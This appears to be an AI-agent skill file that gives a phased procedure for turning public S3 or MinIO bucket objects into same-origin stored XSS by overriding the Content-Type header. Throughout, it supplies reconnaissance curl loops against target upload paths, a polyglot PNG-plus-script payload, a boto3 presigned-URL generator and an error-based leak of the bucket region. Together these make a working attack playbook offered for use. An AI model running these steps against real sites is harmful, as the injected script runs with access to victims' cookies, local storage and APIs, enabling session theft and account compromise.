---
name: s3-minio-content-type-xss
description: Exploit public bucket objects via Content-Type override to achieve stored XSS.
version: 1.0.0
author: uphiago
license: MIT
platforms: [linux]
compatibility: Requires curl, python3, awscli
metadata:
  hermes:
    tags: [recon, S3, MinIO, bucket, XSS, Content-Type, cloud, storage]
    category: recon
    related_skills:
      - hunt-xss
      - hunt-cloud-misconfig
      - firebase-supabase-attack
      - js-secrets-extraction
---

# S3/MinIO Content-Type Override to Stored XSS

Exploit public cloud storage buckets (S3, MinIO, and compatible) by overriding the `Content-Type` response header via query parameters. When a target serves user-uploaded files from its own origin (e.g., `cdn.target.com` or `target.com/uploads/`), a successful override turns a stored HTML/JS payload into same-origin stored XSS — bypassing every upload-time validation the application performed.

## When to Use

- Target serves user-uploaded files (images, avatars, attachments) from a public bucket.
- Files are served under the target's own domain or subdomain (not a random storage domain).
- Upload validation appears solid (extension whitelist, magic byte check, forced Content-Type) — the override bypasses all of these at serve time, not upload time.
- The bucket URL responds to `?response-content-type=` with a changed Content-Type.
- The bucket returns an AWS SignatureDoesNotMatch error leaking the real bucket host and region.

## Prerequisites

- `terminal` tool with curl and python3.
- Identify at least one public object URL served from storage.
- For S3 exploitation: your own AWS account credentials (free tier sufficient).

## Quick Detection

```bash
# Test if an object's Content-Type can be overridden (MinIO and compatible)
curl -skI "https://cdn.target.com/uploads/avatar123.png?response-content-type=text/html" | grep -i content-type

# If you get 'text/html', the override works — proceed to exploitation
# If you get 'Request specific response headers cannot be used for anonymous GET requests', it's S3 — use signed URL approach
```

## Procedure

### Phase 1 — Identify Public Objects

Find uploaded objects served publicly:

```bash
# Check common upload paths
for path in /uploads/ /media/ /static/uploads/ /cdn/ /files/ /assets/img/ /storage/; do
  curl -skI "https://target.com${path}" | grep -E "HTTP|Content-Type|x-amz"
done

# Look for S3/MinIO signatures in URLs
curl -sk "https://target.com/" | grep -oP '(?:s3\.|amazonaws\.|minio|storage\.googleapis)[^"'\''\s]{5,60}'
```

### Phase 2 — Test Content-Type Override

Append the query parameter and check the response:

```bash
OBJECT_URL="https://cdn.target.com/uploads/avatar123.png"

# Test override
curl -skI "${OBJECT_URL}?response-content-type=text/html" | grep -i content-type
```

**Response interpretation:**

| Response | Meaning | Action |
|---|---|---|
| `Content-Type: text/html` | MinIO or compatible — override works anonymously | Go to Phase 3 |
| `Request specific response headers cannot be used for anonymous GET requests` | AWS S3 — override requires signed request | Go to Phase 4 |
| No change in Content-Type | Override not supported | Check other query parameters or move on |

### Phase 3 — MinIO Exploitation (Anonymous Override)

Upload a file containing an HTML/JS payload disguised as a valid image:

```python
# Craft a polyglot file: valid PNG header + HTML payload
payload = b'\x89PNG\r\n\x1a\n' + b'<script>alert(document.domain)</script>'
```

Upload through the application's normal upload flow. The app validates the PNG header and accepts it. Then serve it:

```bash
# The browser renders the file as HTML, executing the script
curl -sk "https://cdn.target.com/uploads/evil.png?response-content-type=text/html"
```

Additional MinIO override parameters to test:

| Parameter | Header Overridden |
|---|---|
| `response-content-type` | `Content-Type` |
| `response-content-disposition` | `Content-Disposition` |
| `response-cache-control` | `Cache-Control` |
| `response-content-encoding` | `Content-Encoding` |
| `response-content-language` | `Content-Language` |

### Phase 4 — S3 Exploitation (Signed Override)

S3 rejects anonymous overrides. Re-sign the request with your own AWS credentials:

```python
import boto3
from botocore.client import Config

def generate_s3_xss_url(bucket, key, region, endpoint_url, content_type="text/html"):
    s3 = boto3.client(
        "s3",
        region_name=region,
        endpoint_url=endpoint_url,
        config=Config(signature_version="s3v4", s3={"addressing_style": "virtual"}),
    )
    url = s3.generate_presigned_url(
        "get_object",
        Params={"Bucket": bucket, "Key": key, "ResponseContentType": content_type},
        ExpiresIn=3600,
    )
    return url

# Usage: python3 s3_xss.py <bucket> <key> <region> <endpoint> [content-type]
# Example: python3 s3_xss.py target-bucket uploads/avatar.png us-east-1 https://s3.us-east-1.amazonaws.com text/html
```

If the bucket name is unknown, trigger a `SignatureDoesNotMatch` error by signing with a wrong host or region. The error response leaks the canonical request containing the real bucket host and region.

### Phase 5 — Verify Impact

The XSS is same-origin only if the object URL is under the target's domain. Verify:

```bash
# Check if the object is served under the target's origin
echo "$OBJECT_URL" | grep -qE "^https?://(www\.)?target\.com" && echo "SAME-ORIGIN XSS" || echo "Cross-origin — lower impact"

# Confirm JavaScript execution context
# The payload runs with access to cookies, localStorage, and API endpoints on the target's origin
```

## Pitfalls

- **Cross-origin buckets have low impact.** If the bucket is on `s3.amazonaws.com` or a random storage domain, the XSS executes in an isolated origin with no access to the target's session.
- **The override must be supported.** Not all storage systems honor response override parameters. S3-compatible systems other than AWS/MinIO may use different parameter names.
- **Upload validation still matters for payload delivery.** The file must pass upload-time checks to reach the bucket. Use polyglot files that satisfy both the validator and the browser.
- **The signed S3 URL expires.** Generated presigned URLs have a configurable expiration. The XSS link stops working after expiry.
- **CloudFront/CDN may cache the original Content-Type.** If a CDN sits in front of the bucket, it may ignore query parameter overrides. Test both the CDN URL and the direct bucket URL.

## Verification

1. Confirm the override works: `curl -skI "${URL}?response-content-type=text/html"` returns `Content-Type: text/html`.
2. Upload a test payload through the application's normal upload flow.
3. Access the uploaded file with the override parameter in a browser — verify the JavaScript executes.
4. Confirm same-origin: the object URL shares the target's domain (not a third-party storage domain).
5. Document the full chain: upload bypass technique → override parameter → same-origin XSS.

## Related Skills

- **`hunt-xss`** — General XSS detection methodology and bypass tables.
- **`hunt-cloud-misconfig`** — Public bucket discovery and cloud storage misconfigurations.
- **`firebase-supabase-attack`** — Firebase/Supabase storage bucket exploitation.
- **`js-secrets-extraction`** — Finding bucket names and storage endpoints in JavaScript bundles.
